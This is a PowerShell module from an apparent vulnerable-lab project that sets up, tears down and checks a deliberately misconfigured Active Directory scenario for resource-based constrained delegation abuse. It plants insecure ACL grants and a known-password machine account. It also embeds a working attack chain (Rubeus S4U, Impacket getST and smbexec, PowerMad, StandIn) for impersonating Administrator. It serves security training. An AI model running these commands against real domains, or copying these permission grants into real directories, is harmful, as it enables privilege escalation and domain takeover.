#Requires -Modules ActiveDirectory

<#
.SYNOPSIS
    Deploys, removes, and tests Resource-Based Constrained Delegation (RBCD)
    abuse scenarios for VulnAD.

.DESCRIPTION
    This module creates a misconfiguration where an attacker-controlled user has
    WriteProperty access to msDS-AllowedToActOnBehalfOfOtherIdentity on a target
    computer. Combined with the ability to create or control a machine account,
    the attacker can configure RBCD and use S4U2Self/S4U2Proxy to impersonate
    privileged users to services on the target.

    MITRE ATT&CK: T1550.003 - Use Alternate Authentication Material: Pass the Ticket

.NOTES
    Module:     VulnAD
    Component:  RBCD Abuse
    Author:     VulnAD Project
#>

function Deploy-RBCD {
    <#
    .SYNOPSIS
        Deploys Resource-Based Constrained Delegation abuse scenarios.
    .DESCRIPTION
        Creates a user with WriteProperty on msDS-AllowedToActOnBehalfOfOtherIdentity
        on a target computer, and an attacker-controlled machine account for RBCD abuse.
    .PARAMETER Difficulty
        Scenario difficulty: Easy, Medium, or Hard.
    .PARAMETER DomainDN
        The distinguished name of the domain (e.g., DC=contoso,DC=com).
    .PARAMETER Domain
        The FQDN of the domain (e.g., contoso.com).
    .EXAMPLE
        Deploy-RBCD -Difficulty Hard -DomainDN 'DC=lab,DC=local' -Domain 'lab.local'
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [ValidateSet('Easy', 'Medium', 'Hard')]
        [string]$Difficulty,

        [Parameter(Mandatory)]
        [string]$DomainDN,

        [Parameter(Mandatory)]
        [string]$Domain
    )

    begin {
        $scenarioName = 'RBCD Abuse'
        Write-VulnStatus -Message "Deploying $scenarioName scenario ($Difficulty)..." -Type Info
        $createdObjects = [System.Collections.Generic.List[string]]::new()

        # GUID for msDS-AllowedToActOnBehalfOfOtherIdentity
        $rbcdGuid = [System.Guid]'3f78c3e5-f79a-46bd-a0b8-9d18116ddc79'
    }

    process {
        try {
            # ---------------------------------------------------------------
            # 1. Create Attacker User
            # ---------------------------------------------------------------
            $pw1 = Get-VulnPassword -Difficulty $Difficulty -Index 0

            $user = New-VulnUser -SamAccountName 'a.garcia' `
                                 -Name 'Alejandro Garcia' `
                                 -Password $pw1 `
                                 -DomainDN $DomainDN `
                                 -Description 'Cloud Infrastructure Engineer'
            $createdObjects.Add("CN=Alejandro Garcia,OU=Users,OU=ADMonolith,$DomainDN")

            Write-VulnResult -Name 'a.garcia' -Detail 'Cloud Infrastructure Engineer created' -Success $true

            # ---------------------------------------------------------------
            # 2. Ensure Servers OU exists
            # ---------------------------------------------------------------
            $serversOU = "OU=Servers,OU=ADMonolith,$DomainDN"
            try {
                Get-ADOrganizationalUnit -Identity $serversOU -ErrorAction Stop | Out-Null
            }
            catch {
                New-ADOrganizationalUnit -Name 'Servers' `
                                        -Path "OU=ADMonolith,$DomainDN" `
                                        -ProtectedFromAccidentalDeletion $false `
                                        -ErrorAction Stop
                $createdObjects.Add($serversOU)
            }

            # ---------------------------------------------------------------
            # 3. Create Target Computer (FILE01)
            # ---------------------------------------------------------------
            try {
                New-ADComputer -Name 'FILE01' `
                               -SamAccountName 'FILE01$' `
                               -Path $serversOU `
                               -Enabled $true `
                               -Description 'VulnAD RBCD target file server' `
                               -ErrorAction Stop
                $createdObjects.Add("CN=FILE01,$serversOU")
                Write-VulnResult -Name 'FILE01' -Detail 'Target computer created in Servers OU' -Success $true
            }
            catch [Microsoft.ActiveDirectory.Management.ADIdentityAlreadyExistsException] {
                Write-VulnStatus -Message 'FILE01 already exists, skipping creation.' -Type Warning
                Write-VulnResult -Name 'FILE01' -Detail 'Computer already exists' -Success $true
            }

            # ---------------------------------------------------------------
            # 4. Create Attacker-Controlled Computer (EVIL01)
            # ---------------------------------------------------------------
            $evilPw = Get-VulnPassword -Difficulty $Difficulty -Index 1
            $evilSecureString = ConvertTo-SecureString -String $evilPw -AsPlainText -Force

            try {
                New-ADComputer -Name 'EVIL01' `
                               -SamAccountName 'EVIL01$' `
                               -Path $serversOU `
                               -Enabled $true `
                               -Description 'VulnAD RBCD attacker-controlled machine' `
                               -AccountPassword $evilSecureString `
                               -ErrorAction Stop
                $createdObjects.Add("CN=EVIL01,$serversOU")
                Write-VulnResult -Name 'EVIL01' -Detail "Attacker-controlled computer created (password: $evilPw)" -Success $true
            }
            catch [Microsoft.ActiveDirectory.Management.ADIdentityAlreadyExistsException] {
                Write-VulnStatus -Message 'EVIL01 already exists, skipping creation.' -Type Warning
                Write-VulnResult -Name 'EVIL01' -Detail 'Computer already exists' -Success $true
            }

            # ---------------------------------------------------------------
            # 5. Grant a.garcia WriteProperty on msDS-AllowedToActOnBehalfOfOtherIdentity on FILE01
            # ---------------------------------------------------------------
            try {
                $attackerObj = Get-ADUser -Identity 'a.garcia' -ErrorAction Stop
                $attackerSID = [System.Security.Principal.SecurityIdentifier]$attackerObj.SID

                $targetDN = (Get-ADComputer -Identity 'FILE01' -ErrorAction Stop).DistinguishedName
                $targetPath = "AD:\$targetDN"
                $acl = Get-Acl -Path $targetPath -ErrorAction Stop

                $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
                    $attackerSID,
                    [System.DirectoryServices.ActiveDirectoryRights]::WriteProperty,
                    [System.Security.AccessControl.AccessControlType]::Allow,
                    $rbcdGuid
                )
                $acl.AddAccessRule($ace)
                Set-Acl -Path $targetPath -AclObject $acl -ErrorAction Stop

                Write-VulnResult -Name 'RBCD ACL (FILE01)' `
                                 -Detail 'a.garcia granted WriteProperty on msDS-AllowedToActOnBehalfOfOtherIdentity' `
                                 -Success $true
            }
            catch {
                Write-VulnStatus -Message "Failed to set RBCD ACL on FILE01: $_" -Type Error
                Write-VulnResult -Name 'RBCD ACL (FILE01)' -Detail $_.Exception.Message -Success $false
            }

            # ---------------------------------------------------------------
            # 6. Grant a.garcia ability to add computer accounts
            #    We grant the user the "Create Computer Objects" right on the
            #    Servers OU so they can create machine accounts directly.
            # ---------------------------------------------------------------
            try {
                $ouPath = "AD:\$serversOU"
                $ouAcl = Get-Acl -Path $ouPath -ErrorAction Stop

                # GUID for Computer class
                $computerClassGuid = [System.Guid]'bf967a86-0de6-11d0-a285-00aa003049e2'

                $createChildAce = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
                    $attackerSID,
                    [System.DirectoryServices.ActiveDirectoryRights]::CreateChild,
                    [System.Security.AccessControl.AccessControlType]::Allow,
                    $computerClassGuid
                )
                $ouAcl.AddAccessRule($createChildAce)
                Set-Acl -Path $ouPath -AclObject $ouAcl -ErrorAction Stop

                Write-VulnResult -Name 'Create Computer ACL' `
                                 -Detail 'a.garcia granted CreateChild (Computer) on Servers OU' `
                                 -Success $true
            }
            catch {
                Write-VulnStatus -Message "Failed to grant computer creation rights: $_" -Type Error
                Write-VulnResult -Name 'Create Computer ACL' -Detail $_.Exception.Message -Success $false
            }

            Write-VulnResult -Name $scenarioName -Detail 'Deployment complete' -Success $true -IsLast

            # ---------------------------------------------------------------
            # 7. Build result object
            # ---------------------------------------------------------------
            $result = @{
                Scenario       = $scenarioName
                Description    = @(
                    "Alejandro Garcia (a.garcia) has WriteProperty on msDS-AllowedToActOnBehalfOfOtherIdentity"
                    "on the FILE01 computer. Additionally, a.garcia has CreateChild rights on the Servers OU"
                    "to create machine accounts. An attacker-controlled machine EVIL01 has been pre-created"
                    "with a known password. The attacker can configure RBCD on FILE01 to allow EVIL01 to"
                    "impersonate any user (including Domain Admins) to FILE01's services via S4U2Self/S4U2Proxy."
                ) -join ' '
                CreatedObjects = $createdObjects.ToArray()
                AttackCommands = @(
                    "# Step 1: Configure RBCD — Allow EVIL01 to act on behalf of users to FILE01"
                    "Set-ADComputer FILE01 -PrincipalsAllowedToDelegateToAccount EVIL01$"
                    ""
                    "# Step 2: Rubeus — Request TGT for EVIL01 with known password"
                    "Rubeus.exe hash /password:$evilPw /user:EVIL01$ /domain:$Domain"
                    "Rubeus.exe s4u /user:EVIL01$ /rc4:<EVIL01_HASH> /impersonateuser:Administrator /msdsspn:cifs/FILE01.$Domain /ptt"
                    ""
                    "# Impacket — Full attack chain"
                    "python3 rbcd.py -delegate-from 'EVIL01$' -delegate-to 'FILE01$' -action write '$Domain/a.garcia:$pw1'"
                    "python3 getST.py -spn 'cifs/FILE01.$Domain' -impersonate Administrator '$Domain/EVIL01$:$evilPw'"
                    "export KRB5CCNAME=Administrator.ccache"
                    "python3 smbexec.py -k -no-pass FILE01.$Domain"
                    ""
                    "# PowerMad — Configure RBCD via PowerShell"
                    "Set-MachineAccountAttribute -MachineAccount FILE01 -Attribute msDS-AllowedToActOnBehalfOfOtherIdentity -Value EVIL01$"
                    ""
                    "# StandIn — Alternative RBCD configuration"
                    "StandIn.exe --computer FILE01 --sid <EVIL01_SID>"
                )
                AttackPath     = @(
                    '1. Enumerate computers where the attacker has WriteProperty on msDS-AllowedToActOnBehalfOfOtherIdentity (BloodHound).'
                    '2. Create or use a controlled machine account (EVIL01 with known password).'
                    '3. Set msDS-AllowedToActOnBehalfOfOtherIdentity on FILE01 to include EVIL01.'
                    '4. Use Rubeus S4U or Impacket getST to request service tickets as Administrator.'
                    '5. Use the forged ticket to access FILE01 as a Domain Admin.'
                )
                MitreID        = 'T1550.003'
                Difficulty     = $Difficulty
            }

            return $result
        }
        catch {
            Write-VulnStatus -Message "Failed to deploy $scenarioName scenario: $_" -Type Error
            throw
        }
    }
}

function Remove-RBCD {
    <#
    .SYNOPSIS
        Removes all objects created by Deploy-RBCD.
    .PARAMETER DomainDN
        The distinguished name of the domain.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$DomainDN
    )

    Write-VulnStatus -Message 'Removing RBCD Abuse scenario...' -Type Info

    $rbcdGuid = [System.Guid]'3f78c3e5-f79a-46bd-a0b8-9d18116ddc79'
    $computerClassGuid = [System.Guid]'bf967a86-0de6-11d0-a285-00aa003049e2'

    # Remove RBCD ACL from FILE01
    try {
        $attackerObj = Get-ADUser -Identity 'a.garcia' -ErrorAction Stop
        $attackerSID = $attackerObj.SID

        $targetDN = (Get-ADComputer -Identity 'FILE01' -ErrorAction Stop).DistinguishedName
        $acl = Get-Acl -Path "AD:\$targetDN" -ErrorAction Stop

        $rulesToRemove = $acl.Access | Where-Object {
            $_.ObjectType -eq $rbcdGuid -and
            (try { $_.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier]) -eq $attackerSID } catch { $false })
        }
        foreach ($rule in $rulesToRemove) { $acl.RemoveAccessRule($rule) | Out-Null }
        Set-Acl -Path "AD:\$targetDN" -AclObject $acl -ErrorAction Stop

        # Clear the RBCD attribute in case it was modified during attack
        Set-ADComputer -Identity 'FILE01' -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity' -ErrorAction SilentlyContinue

        Write-VulnResult -Name 'RBCD ACL (FILE01)' -Detail 'ACL and delegation attribute cleaned' -Success $true
    }
    catch {
        Write-VulnResult -Name 'RBCD ACL (FILE01)' -Detail "Cleanup failed: $_" -Success $false
    }

    # Remove CreateChild ACL from Servers OU
    $serversOU = "OU=Servers,OU=ADMonolith,$DomainDN"
    try {
        $ouAcl = Get-Acl -Path "AD:\$serversOU" -ErrorAction Stop

        $rulesToRemove = $ouAcl.Access | Where-Object {
            $_.ObjectType -eq $computerClassGuid -and
            $_.ActiveDirectoryRights -match 'CreateChild' -and
            (try { $_.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier]) -eq $attackerSID } catch { $false })
        }
        foreach ($rule in $rulesToRemove) { $ouAcl.RemoveAccessRule($rule) | Out-Null }
        Set-Acl -Path "AD:\$serversOU" -AclObject $ouAcl -ErrorAction Stop

        Write-VulnResult -Name 'Create Computer ACL' -Detail 'CreateChild permission removed from Servers OU' -Success $true
    }
    catch {
        Write-VulnResult -Name 'Create Computer ACL' -Detail "Cleanup failed: $_" -Success $false
    }

    # Remove computers
    foreach ($computer in @('FILE01', 'EVIL01')) {
        try {
            Remove-ADComputer -Identity $computer -Confirm:$false -ErrorAction Stop
            Write-VulnResult -Name $computer -Detail 'Computer removed' -Success $true
        }
        catch {
            Write-VulnResult -Name $computer -Detail "Removal failed: $_" -Success $false
        }
    }

    # Remove user
    try {
        Remove-ADUser -Identity 'a.garcia' -Confirm:$false -ErrorAction Stop
        Write-VulnResult -Name 'a.garcia' -Detail 'User removed' -Success $true
    }
    catch {
        Write-VulnResult -Name 'a.garcia' -Detail "Removal failed: $_" -Success $false
    }

    Write-VulnResult -Name 'RBCD Abuse' -Detail 'Cleanup complete' -Success $true -IsLast
}

function Test-RBCD {
    <#
    .SYNOPSIS
        Validates that the RBCD abuse scenario is correctly deployed.
    .PARAMETER DomainDN
        The distinguished name of the domain.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$DomainDN
    )

    $results = @{}
    $rbcdGuid = [System.Guid]'3f78c3e5-f79a-46bd-a0b8-9d18116ddc79'

    # Check user exists
    try {
        $attackerObj = Get-ADUser -Identity 'a.garcia' -ErrorAction Stop
        $results['a.garcia'] = $true
    }
    catch {
        $results['a.garcia'] = $false
    }

    # Check computers exist
    foreach ($computer in @('FILE01', 'EVIL01')) {
        try {
            Get-ADComputer -Identity $computer -ErrorAction Stop | Out-Null
            $results[$computer] = $true
        }
        catch {
            $results[$computer] = $false
        }
    }

    # Check RBCD ACL on FILE01
    if ($results['a.garcia'] -and $results['FILE01']) {
        try {
            $attackerSID = $attackerObj.SID
            $targetDN = (Get-ADComputer -Identity 'FILE01' -ErrorAction Stop).DistinguishedName
            $acl = Get-Acl -Path "AD:\$targetDN" -ErrorAction Stop

            $rbcdAces = $acl.Access | Where-Object {
                $_.ObjectType -eq $rbcdGuid -and
                $_.ActiveDirectoryRights -match 'WriteProperty' -and
                (try { $_.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier]) -eq $attackerSID } catch { $false })
            }
            $results['RBCD ACL (FILE01)'] = ($null -ne $rbcdAces -and @($rbcdAces).Count -ge 1)
        }
        catch {
            $results['RBCD ACL (FILE01)'] = $false
        }
    }
    else {
        $results['RBCD ACL (FILE01)'] = $false
    }

    # Check CreateChild on Servers OU
    $serversOU = "OU=Servers,OU=ADMonolith,$DomainDN"
    if ($results['a.garcia']) {
        try {
            $computerClassGuid = [System.Guid]'bf967a86-0de6-11d0-a285-00aa003049e2'
            $ouAcl = Get-Acl -Path "AD:\$serversOU" -ErrorAction Stop

            $createAces = $ouAcl.Access | Where-Object {
                $_.ObjectType -eq $computerClassGuid -and
                $_.ActiveDirectoryRights -match 'CreateChild' -and
                (try { $_.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier]) -eq $attackerSID } catch { $false })
            }
            $results['CreateChild ACL (Servers OU)'] = ($null -ne $createAces -and @($createAces).Count -ge 1)
        }
        catch {
            $results['CreateChild ACL (Servers OU)'] = $false
        }
    }
    else {
        $results['CreateChild ACL (Servers OU)'] = $false
    }

    $allPassed = $results.Values -notcontains $false

    foreach ($key in $results.Keys) {
        $isLast = ($key -eq ($results.Keys | Select-Object -Last 1))
        Write-VulnResult -Name $key -Detail $(if ($results[$key]) { 'Validated' } else { 'Missing' }) `
                         -Success $results[$key] -IsLast:$isLast
    }

    return $allPassed
}

Export-ModuleMember -Function Deploy-RBCD, Remove-RBCD, Test-RBCD

